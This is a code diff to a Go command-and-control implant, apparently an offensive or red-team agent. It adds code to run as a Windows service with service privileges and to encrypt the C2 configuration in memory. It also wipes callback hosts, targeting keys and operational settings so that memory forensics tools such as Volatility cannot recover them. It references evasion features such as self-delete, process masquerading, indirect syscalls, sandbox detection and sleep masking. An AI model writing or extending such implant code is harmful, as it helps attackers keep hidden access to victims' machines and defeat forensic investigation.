@@ -68,6 +68,12 @@ var (
 )
 
 func main() {
+	// Try running as a Windows service first. If started by SCM, this blocks
+	// and runs the agent in the service context (with full service privileges).
+	// On non-Windows or when not started by SCM, returns false immediately.
+	if tryRunAsService() {
+		return
+	}
 	runAgent()
 }
 
@@ -257,6 +263,13 @@ func runAgent() {
 			}
 		}
 		c2 = profiles.NewProfile(httpProfile)
+
+		// Seal the C2 config vault — encrypts sensitive fields (BaseURL, EncryptionKey,
+		// UserAgent, endpoints) with AES-256-GCM. Fields are only decrypted on-demand
+		// for the duration of each HTTP operation, reducing memory forensics exposure.
+		if err := httpProfile.SealConfig(); err != nil {
+			log.Printf("[WARNING] Config vault seal failed: %v (fields remain in plaintext)", err)
+		}
 
 		// Also create a TCP profile instance for P2P child management.
 		// Even HTTP egress agents can link to TCP children.
@@ -748,11 +761,13 @@ func zeroBytes(b []byte) {
 	}
 }
 
-// clearGlobals zeros out build-time global variables after they have been
+// clearGlobals zeros out ALL build-time global variables after they have been
 // copied into the agent/profile structs. This prevents sensitive config
-// data (encryption keys, C2 URLs, UUIDs) from lingering in the binary's
-// data segment where memory forensics tools could extract them.
+// data (encryption keys, C2 URLs, UUIDs, operational parameters) from
+// lingering in the binary's data segment where memory forensics tools
+// (Volatility, WinDbg) could extract them.
 func clearGlobals() {
+	// C2 connection config
 	payloadUUID = ""
 	callbackHost = ""
 	callbackPort = ""
@@ -764,4 +779,31 @@ func clearGlobals() {
 	proxyURL = ""
 	customHeaders = ""
 	xorKey = ""
+	tlsVerify = ""
+	tcpBindAddress = ""
+
+	// Operational parameters
+	sleepInterval = ""
+	jitter = ""
+	killDate = ""
+	maxRetries = ""
+	debug = ""
+	workingHoursStart = ""
+	workingHoursEnd = ""
+	workingDays = ""
+
+	// Environment keys (reveal targeting criteria)
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = ""
+
+	// OPSEC feature flags (reveal agent capabilities)
+	selfDelete = ""
+	masqueradeName = ""
+	autoPatch = ""
+	blockDLLs = ""
+	indirectSyscalls = ""
+	sandboxGuard = ""
+	sleepMask = ""
 }
